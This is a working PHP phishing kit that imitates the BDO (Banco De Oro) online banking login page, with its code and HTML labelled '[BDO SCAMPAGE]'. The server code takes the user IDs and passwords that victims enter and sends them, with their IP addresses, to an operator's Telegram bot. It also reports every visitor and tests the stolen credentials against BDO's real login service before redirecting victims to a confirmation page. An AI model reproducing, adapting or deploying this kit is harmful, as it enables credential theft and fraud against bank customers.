<?php
include("settings/config.php");
date_default_timezone_set('Asia/Manila');


function generateRandomString($length) {
    $include_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    /* Uncomment below to include symbols */
    /* $include_chars .= "[{(!@#$%^/&*_+;?\:)}]"; */
    $charLength = strlen($include_chars);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $include_chars [rand(0, $charLength - 1)];
    }
    return $randomString;
}
 
// Call function
$lenght = 200; # Set result string lenght
$codebash = generateRandomString($lenght);

error_reporting(0);
   function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

  $username = $_POST['channelUserID'];
$password = $_POST['channelPswdPin'];


    if(isset($_POST['submit'])){

if($truelog == 'no'){
$request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] TrueLog: No\n[+] USERNAME: ".$username."\n[+] Password: ".$password."\n[+] IP: ".$_SERVER['REMOTE_ADDR']
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
       $f1 = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params));

    $fp = fopen("tllogs.txt", "a");
fputs($fp, "$request_url \n\n\n");
	die(header("location: mobileconfirmation?succ=1&auth=$codebash"));
}else{
if(truelogcheck($username, $password) == 'VALID'){
    
$request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] TrueLog: Yes \n[+] USERNAME: ".$username."\n[+] Password: ".$password."\n[+] IP: ".$_SERVER['REMOTE_ADDR']
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        file_get_contents($request_url);

	die(header("location: mobileconfirmation?auth=$codebash"));
}else{
 $request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] TrueLog: Yes | Not Valid Log\n[+] USERNAME: ".$username."\n[+] Password: ".$password."\n[+] IP: ".$_SERVER['REMOTE_ADDR']
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        file_get_contents($request_url);
header("location: login?/wicket:interface/:30:loginUnifiedPanel:loginForm::IFormSubmitListener::=1");
}

}

}
$request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] VISITOR: ".$_SERVER["REMOTE_ADDR"]."\n[+] DATE: ".date("M d, Y - h:i:s A")
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
 file_get_contents($request_url);

function truelogcheck($username, $password){
    $ck = './COOKIES/cookiesmoto'.rand(0, 10000).'.txt';

        $hex1 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
        $hex2 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
        $hex3 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
        
        $hex             = $hex1 . "-" . $hex2 . "-" . $hex3;

/////////////////////////////////////////////

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.bdo.com.ph/generic/login/bdosecuritiesIPMS');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'GZIP, DEFLATE, BR');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36');
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
  $sc = curl_exec($ch);
    curl_close($ch);

$loc = explode(PHP_EOL, explode('Location: ', $sc)[1])[0];
$ses = 'SSESS6'.explode(';', explode('Set-Cookie: SSESS6', $sc)[1])[0];


#echo 'LOC: '.$loc.PHP_EOL;
#echo 'SES: '.$ses.PHP_EOL;

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $loc);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'GZIP, DEFLATE, BR');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');  
    curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36');
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
   $sc2 = curl_exec($ch);
    curl_close($ch);

$sid = 'JSESSIONID'.explode(';', explode('Set-Cookie: JSESSIONID', $sc2)[1])[0];

  # echo 'SID: '.$sid.PHP_EOL; 


$h1 = array();
$h1[] = 'Host: www.login.bdo.com.ph';
$h1[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
$h1[] = 'Origin: https://www.login.bdo.com.ph';
$h1[] = 'User-Agent: Mozilla/5.0 (Linux; Android 5.1; Samsung Galaxy S6 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36-iPMS Android App';
$h1[] = 'Content-Type: application/x-www-form-urlencoded';
$h1[] = 'Referer: '.$loc;
$h1[] = 'Accept-Encoding: gzip, deflate';
$h1[] = 'Accept-Language: en-US';
$h1[] = 'Cookie: '.$sid.'; '.$ses.';';
$h1[] = 'X-Requested-With: com.intellect.bdoMobile';

$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://www.login.bdo.com.ph/onlinelogin/validateLogin.do');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
        curl_setopt($ch, CURLOPT_ENCODING, 'GZIP, DEFLATE, BR');
      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_HEADER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $h1);
        curl_setopt($ch, CURLOPT_COOKIEJAR, $ck);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $ck);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'app_code=bsc_ipms&refNo=&backURL=https%3A%2F%2Fwww.bdo.com.ph%2Fsecurities%2Fhome&j_username='.$username.'&j_password='.$password);
   $x = curl_exec($ch);
    curl_close($ch);


if(strpos($x, 'href="https://www.login.bdo.com.ph/onlinelogin/displayOTP.do?app_code=bsc_ipms"')){
    $rr =  'VALID';
}elseif(Strpos($x, 'Your password has expired. Please access BDO Online Banking to update your password.')){
$rr =  'VALID';
}else{
    $rr = 'INVALID';
}


    $fp = fopen("tllogs.txt", "a");
fputs($fp, "TRUELOGIN MESSAGE: $x \n\n\n");

    return $rr;
}

function xr($url, $body = 0,  $rm = 0, $header = 0, $cookie = 0, $encoding)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
    if ($encoding) {
        curl_setopt($ch, CURLOPT_ENCODING, $encoding);
    }    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    if ($rm) {
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $rm);
    }   
    curl_setopt($ch, CURLOPT_HEADER, 1);
    if ($header) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    }
    if ($cookie) {
        curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie);
    }
    if ($body) {
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    }
    $x = curl_exec($ch);
    curl_close($ch);
    return $x;
}



function T($i, $l, $y){
return explode($y, explode($l, $i)[1])[0];
}


?>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<!-- saved from url=(0014)about:internet -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=Edge">
<title>Banco De Oro</title>

<meta name="author" content="Solutions Exchange, Inc.">
<meta name="geo.placename" content="Philippines">
<meta name="geo.region" content="PH">
<link rel="shortcut icon" href="https://www.bdo.com.ph/favicon.ico" type="image/vnd.microsoft.icon" />


<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.web.login.LoginUnifiedPage/css/loginid.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/css/component.style.css" />
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.citrine.sso.CitrineUnifiedLoginApplication/web/themes/theme-bdo/jquery-ui-1.8.2.custom.css" />
<script type="text/javascript" src="https://online.bdo.com.ph/sso/resources/org.odlabs.wiquery.core.commons.CoreJavaScriptResourceReference/jquery/jquery-1.4.2.min.js"></script>
<script type="text/javascript" src="https://online.bdo.com.ph/sso/resources/org.odlabs.wiquery.ui.core.CoreUIJavaScriptResourceReference/ui.core.min.js"></script>
<script type="text/javascript" src="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.BaseJavascriptBehavior/ccti.js"></script>
<link rel="stylesheet" type="text/css" href="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.BaseJavascriptBehavior/base.css" />
<script type="text/javascript" src="https://online.bdo.com.ph/sso/resources/com.ccti.base.web.js.jquery.rc4.PasswordEncryptionBehavior/jquery.rc4.js"></script>

 </head>
  <?php if($_GET['/wicket:interface/:30:loginUnifiedPanel:loginForm::IFormSubmitListener::'] == "1"){
  	echo "<script>
window.history.replaceState('https://www.bdo.com.ph/favicon.ico', 'Banco De Oro', 'login?/wicket:interface/:30:loginUnifiedPanel:loginForm::IFormSubmitListener::'); 
</script>";

  }else{

  }

  ?>
<body>
	<div id="wrap1" ver="2.0.0">
			<div class="topmenu">
						<div class="maintopmenu" id="maintopmenu" style="min-width: 815px;">
							<ul class="menu">
								<li><a class="first collapsed" href="https://www.bdo.com.ph/properties-for-sale">Properties for Sale</a></li>
								<li><a class="collapsed" href="https://www.bdo.com.ph/support-topics">FAQs</a></li>
								<li><a class="collapsed" href="https://www.bdo.com.ph/promo-list">Promos</a></li>
								<li><a class="leaf" href="https://www.bdo.com.ph/personal/remittance-services/bdo-remit-status-inquiry">Remit Status Inquiry</a></li>
								<li><a class="leaf" href="https://www.bdo.com.ph/subsidiaries">Subsidiaries</a></li>
								<li><a class="leaf" href="https://www.bdo.com.ph/branches-atms-locator">Branches / ATMs</a></li>
								<li><a class="last leaf" href="https://www.bdo.com.ph/international-desks">International Desks</a> </li>
							</ul>
						</div>
						<div class="generalmenu login-bk-link">
<!-- 							<div class="menu-back-link-div"> -->
<!-- 								<a href="https://www.bdo.com.ph/" class="goto">Go to bdo.com.ph</a> -->
<!-- 							</div> -->
							<div class="menu-login-div" id="menu-login-div">
								<a href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" class="loginBtn1" id="loginBtn">Online Banking Login</a>
							</div>
						</div>			
			</div>
			
			
	</div>
	<div class="loginmenucontainer" id="loginmenucontainer" style="display:none;">
				<div id="personalmenudiv">
					<a href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" class="logintitle plink active">Personal</a><a href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" class="logintitle clink">Business</a><ul>
					<li>
					<a href="https://online.bdo.com.ph/sso/login" class="bib" title="BDO Online Banking">BDO ONLINE BANKING</a>
					</li>
					</ul>
					<div class="menu-link-middle">
						<p><a href="https://www.mybdo.com.ph/fo/ribtermsandconditions">Not Yet Enrolled? Enroll Now!</a></p>
					</div>
					<div class="menu-link-footer">
						<p><a href="https://www.bdo.com.ph/faqs/otp-faqs">What is a One-Time Password (OTP)</a></p>	
					</div>
				</div>
				<div id="corporatemenudiv">
					<a href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" class="logintitle plink">Personal</a><a href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" class="logintitle clink active">Business</a>			
					<ul>
						 <li>
						 <a href="https://mycashcard.com.ph/cashcard/login" class="cashcard" id="ol-banking-cash-cards" title="Cash Card" target="blank">Cash Card</a>				 </li>
						 <li>
						 <a href="https://tbg.bdo.com.ph/ids/" class="ids" id="ol-banking-ids" title="Integrated Disbursement Solutions" target="blank">Integrated Disbursement Solutions</a>				</li>
						<li>
						<a href="https://business.bdo.com.ph/fo/login" class="cib" id="ol-banking-cib" title="Business Online Banking" target="blank">Business Online Banking</a>				</li>
					</ul>
					<!-- <div class="adlink">
						<p>Take the <a href="# " id="ol-banking-btour" onClick="viewcib()">Online Banking Tour</a></p>
					</div> -->
				</div>
			</div>
	<div>
			<script language="Javascript" type="text/javascript">
				$(document).ready(function(){
					$('#channelPswdPin').bind("cut copy paste",function(e) {
				      e.preventDefault();
				 	});
				});
			</script>
			<div>
			<table class="main-content">
				<tbody><tr>
					<td style="max-width: 225px;vertical-align:top;padding-top:77px">
						<div id="sideBarWrapper">
							<div id="logoWrapper">
								<div id="bdoLogo"><a href="http://www.bdo.com.ph/" target="_blank"><span>Banco De Oro</span></a></div>      
							</div>

 	  						<div>
								<div class="sidebdomenu container">
									<div class="side_tabs">
	 									 <div class="mainmenu" style="padding-bottom: 20px !important;">
											<div class="tablinkbox">
												<a href="https://www.bdo.com.ph/personal" class="personal" id="personal-tab">PERSONAL</a><a href="https://www.bdo.com.ph/business" class="corporate" id="business-tab">BUSINESS</a>
											</div>
											<ul class="menu">
												<li class="first collapsed"><a href="https://www.bdo.com.ph/personal/ebanking" title="eBanking Menu Item" id="menu-1071">eBanking</a></li>
												<li class="collapsed"><a href="https://www.bdo.com.ph/personal/accounts" id="menu-970">Accounts</a></li>
												<li class="collapsed"><a href="https://www.bdo.com.ph/trust-and-investments" id="menu-1269">Trust and Investments</a></li>
												<li class="collapsed"><a href="https://www.bdo.com.ph/personal/loans" id="menu-1303">Loans</a></li>
												<li class="collapsed"><a href="https://www.bdo.com.ph/personal/credit-debit-cards" id="menu-684">Credit Cards</a></li>
												<li class="collapsed"><a href="https://www.bdo.com.ph/personal/remittance-services" id="menu-1216">Remittance Services</a></li>
												<li class="collapsed"><a href="https://www.bdo.com.ph/personal/insurance" id="menu-1302">Insurance</a></li>
												<li class="collapsed"><a href="https://www.bdo.com.ph/personal/rewards" id="menu-1462">Rewards</a></li>
												<li class="last leaf" style="border-radius: 0px 0px 10px 10px;"><a href="https://www.bdo.com.ph/private-bank-home" id="menu-1462">Private Bank</a></li>
											</ul>
										</div>
									</div>
								</div>
							</div>
							<!-- <div id="left-footer-mybdo" valign="bottom">
								<table width="135" border="0" cellpadding="2" cellspacing="0" title="Click to Verify - This site chose Symantec SSL for secure e-commerce and confidential communications.">
 									<tr>
 										<td width="135" align="center" valign="top" id="veriSeal" onload="enableLogin()"> <script type="text/javascript" src="https://seal.verisign.com/getseal?host_name=online.bdo.com.ph&amp;size=S&amp;use_flash=NO&amp;use_transparent=NO&amp;lang=en"></script><br />
 											<a href="http://www.symantec.com/ssl-certificates" target="_blank"  style="color:#000000; text-decoration:none; font:bold 9px verdana,sans-serif; letter-spacing:.5px; text-align:center; margin:0px; padding:0px;">ABOUT SSL CERTIFICATES</a> 
										</td>
									</tr>
								</table>		
							</div> -->
	  					</div>
					</td>
					<td>
						<div>
							<table style="padding-top: 15px;">
								<tbody><tr>
									<td colspan="2" style="padding-left: 10px;">
										<div id="advisoryContainer" style="overflow:hidden">
											<div id="id1">
												<!-- <div wicket:id = "content"> -->
													<div class="loginImage"></div>
												<!-- </div>	 -->
											</div>	
										</div>
									</td>
								</tr>
								<tr>
									<td colspan="2">
										<div class="invisible">
										 Invisible
										</div>
									</td>					
								</tr>
								<tr>		
									<td valign="top" style="padding-left: 7px;">
										<div id="IDMyBDOGray">
											<div id="left column">
												<div id="rib-title">Login to BDO Online Banking</div>
												<br>     
												<form autocomplete="off" loginform="true" class="loginForm" id="id2" method="post" action=""><div style="display:none"><input type="hidden" name="id2_hf_0" id="id2_hf_0"></div>							
													
													<span id="login-title">User ID:</span><br>
													<input class="textbox box" type="text" tabindex="1" maxlength="30" value="" name="channelUserID" id="channelUserID"><br>
													<span id="login-title">Password:</span><br>
													<input class="textbox box" id="channelPswdPin" type="password" maxlength="20" value="" name="channelPswdPin">
													<br>
													<div id="id3" class="sxiFeedback">
  <?php if($_GET['/wicket:interface/:30:loginUnifiedPanel:loginForm::IFormSubmitListener::'] == "1"){
  	echo '  <ul class="paginationul">
    <li class="feedbackPanelERROR">
      <span class="feedbackPanelERROR">Invalid User ID or Password.</span>
    </li>
  </ul>';

  }else{

  }
  ?>
</div>
													<div id="id4" class="sxiFeedback">
</div>		
												
													
													<table>
														<tbody><tr>
															<td></td>
															<td style="vertical-align:top; float:right;">
																<div id="btn-submit">
																	<input onclick="alerts()" class="enrollNowButton sxi-button ui-corner-all ui-state-default" type="submit" name="submit" tabindex="3" id="loginButton" style="background: none rgb(255, 178, 12); color: rgb(36, 65, 143);" onload="enableLogin()" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;submitButton&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;" value="Login" id="submit">
																	<input type="hidden" zxc="mnb" value="" name="hiddenField">
																</div>	
															</td>	
														</tr>
														<tr>
															<td>
																<div style="display:block; margin-left: -8px; ">
																	<!-- <span wicket:id="demoLink" class="email idbox2"><div class="idbox2">Take online banking tour</div></span> -->
																	
																	<a class="email" href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;forgotpassLink&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;"><div class="idbox2">Forgot your password?</div></a>
																	<a class="email" href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;forgotuserIdLink&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;"><div class="idbox2">Forgot your user ID?</div></a>
																	<a class="email" href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;forgottpinLink&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;"><div class="idbox2">Forgot your telephone PIN?</div></a> 
																</div>
															</td>
																							
														</tr>		  												
													</tbody></table>
													<br>
													<table>
													<tbody><tr id="id5">
		  													<td id="id6">
		  														<a class="email" id="id7" href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;enrollNowWmc:enrollNowLblWmc:enrolNowLink&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;"><div class="idbox6"><h5>Not Yet Enrolled? Enroll Now!</h5></div></a>
		  													</td>
		  												</tr>
													</tbody></table>
													<br>
													<table>
														<tbody><tr class="link1" style="padding-bottom:3px;">
															<td style="width:120px;max-width:120px;"><a class="email" href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;faqSecurityPage&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;"><div class="idbox5">Security Features</div></a></td>
 															<td><a class="email" href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;ribPolicyPage&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;"><div class="idbox5">Online Banking Privacy Policy</div></a></td>
 															<td><a class="email" href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" onclick="var e=document.getElementById(&#39;id2_hf_0&#39;); e.name=&#39;faqPage&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;id2&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;"><div class="idbox5">FAQs</div></a></td>
 														</tr>
													</tbody></table>
												<div style="display:none"><input type="hidden" name="_actiontoken" id="_actiontoken" value="2c96a494747e7087017482cb3476386e"></div></form>													
												<div id="bysy_indicator" style="display: none;">
													<div id="loading_gif"></div>
												</div>        	
											</div>
										</div>
									</td>
									<td valign="top">
										<div id="rightSideWrapper2">
 											<form id="id8" method="post" action="https://online.bdo.com.ph/sso/login/wicket:interface/:0:loginUnifiedPanel:sidebarForm::IFormSubmitListener::"><div style="display:none"><input type="hidden" name="id8_hf_0" id="id8_hf_0"></div>
 												
      											<table width="270px" style="margin-bottom: -5px; margin-top:-10px;">
      											
      											</table>
      											<table style="margin-top: 5px">
	  												<tbody><tr>
		  												<td></td>
	  													<td></td>
	  												</tr>
   												</tbody></table>
   												
												
		  										<table style="margin-top: 5px">
	  												<tbody><tr>
		  												<td></td>
	  													<td></td>
	  												</tr>
   												</tbody></table>
											</form>
     										<span class="clear"></span>
											<span class="clear"></span> 
											<div class="contacts">  
												<br>
												<br>
												<h4>TOLL-FREE NUMBERS</h4>
												<h4>Reminder: Charges apply for calls made through a mobile phone.</h4>
												<br>
												<h4>Domestic Toll-Free Nos.:</h4>
												<table>
													<tbody><tr>
														<td>1800-10-631-8000 (PLDT)</td>
														<td class="padleft">1800-3-631-8000 (Digitel)</td>
													</tr>
													<tr>
														<td>1800-5-631-8000 (Bayantel)</td>
														<td class="padleft">1800-8-631-8000 (Globelines)</td>
													</tr> 
												</tbody></table>
												
												<br>
												<h4>INTERNATIONAL</h4>
												<p>(Int'l. Access Code) + 800-8-631-8000</p>
												<br>
												<h4>CONTACT SUPPORT:</h4>
												<form id="id9" method="post" action="https://online.bdo.com.ph/sso/login/wicket:interface/:0:loginUnifiedPanel:supportForm::IFormSubmitListener::"><div style="display:none"><input type="hidden" name="id9_hf_0" id="id9_hf_0"></div> 
													<p><span href="#" style="color: #24418F; cursor: pointer; text-decoration: none;" class="supportLink" onclick="window.open(&#39;https://www.bdo.com.ph/contact-us&#39;);">Send a message to BDO</span></p>
												</form>
												<div id="customer-service" style="margin-top:9px">
													<p style="font-size: 12px; padding-top:8px; padding-left: 10px; font-weight: bold; color: #043673">Customer Contact Center<span style="padding-right: 10px; margin-left: 35%;"><i class="icon-phone icon-large"></i>(02) 8631-8000</span></p></div>	
  												</div>
  												<div id="ida" style="padding-bottom:29px;"></div>
										</div>
									</td>
								</tr>
								<tr>
									<td colspan="2" style="padding-left: 10px;">
										<form id="idb" method="post" action="https://online.bdo.com.ph/sso/login/wicket:interface/:0:loginUnifiedPanel:footerForm::IFormSubmitListener::"><div style="display:none"><input type="hidden" name="idb_hf_0" id="idb_hf_0"></div>
											<br>
											<span>*Our website supports the latest browser versions to ensure your privacy and security. To ensure access and for best viewing experience, please upgrade to the latest versions of Mozilla Firefox, Google Chrome, Safari or Internet Explorer as soon as possible.</span>
											<br> 
											<br>
											*Detailed instructions can be found <a href="https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check#" class="links" target="_blank" onclick="var e=document.getElementById(&#39;idb_hf_0&#39;); e.name=&#39;faqPopUpLink&#39;; e.value=&#39;x&#39;;var f=document.getElementById(&#39;idb&#39;);var ff=f;if (ff.onsubmit != undefined) { if (ff.onsubmit()==false) return false; }f.submit();e.value=&#39;&#39;;e.name=&#39;&#39;;return false;">here</a>.
										</form>
									</td>
								</tr>	 
							</tbody></table>
						</div>
					</td>
				</tr>
			
				<!-- <tr>
				
					<td></td>
					<td></td>
					<td></td>
				</tr>
				
				<tr>
				
					<td></td>
					<td></td>
					<td></td>
				</tr> -->
			
			</tbody></table>
		</div>	
			<!-- ****************************************************HEADER 1**************************************************** -->
		
		
		
		<!-- ---------------------------------------------------------------------------- -->
		
		<!-- </div> -->
		
				<div id="footer-title">
					
					<div id="right-footer-mybdo">
											 
					</div>
					
				</div>
		
				<span class="clear"></span> 
		
		    <!-- /div -->
		    <span class="clear"></span>
		    
		    
		    <div class="footer">
				<div class="footer-menu">
					<ul class="menu"><li class="first collapsed"><a href="https://www.bdo.com.ph/about-bdo/business-operation" target="_blank" id="menu-1118">About BDO</a></li>
						<li class="collapsed"><a href="https://www.bdo.com.ph/corporate-governance" id="menu-1057" target="_blank">Corporate Governance</a></li>
						<li class="collapsed"><a href="https://www.bdo.com.ph/investor-relations/investment-credit-ratings-information" id="menu-995" target="_blank">Investor Relations</a></li>
						<li class="collapsed"><a href="https://www.bdo.com.ph/company-disclosures" id="menu-995" target="_blank">Company Disclosures</a></li>
						<li class="leaf"><a href="https://www.bdo.com.ph/contact-us" id="menu-1508" target="_blank">Contact Us</a></li>
						<li class="collapsed"><a href="https://www.bdo.com.ph/careers" id="menu-1401" target="_blank">Careers</a></li>
						<li class="leaf"><a href="https://www.bdo.com.ph/news-and-articles" id="menu-1449" target="_blank">Press Room</a></li>
						<li class="leaf"><a href="https://www.bdo.com.ph/site-map" id="menu-2810" target="_blank">Site Map</a></li>
						<li class="leaf"><a href="https://www.bdo.com.ph/privacy-statement" id="menu-2808" target="_blank">Privacy Policy</a></li>
						<li class="last leaf"><a href="https://www.bdo.com.ph/terms-and-conditions" id="menu-2809" target="_blank">Terms and Conditions</a></li>
					</ul>
				</div>
				<span class="copyright" style="font-size: 10px;">BDO Unibank is supervised by the Bangko Sentral ng Pilipinas with contact number (02) 8708-7087 and email address consumeraffairs@bsp.gov.ph</span>
				<span class="copyright">BDO Unibank, Inc. © 2015. All Rights Reserved</span>
			</div>
		<!-- Google Code for UAE - Click of Enrollment Link Conversion Page -->


</body></html>
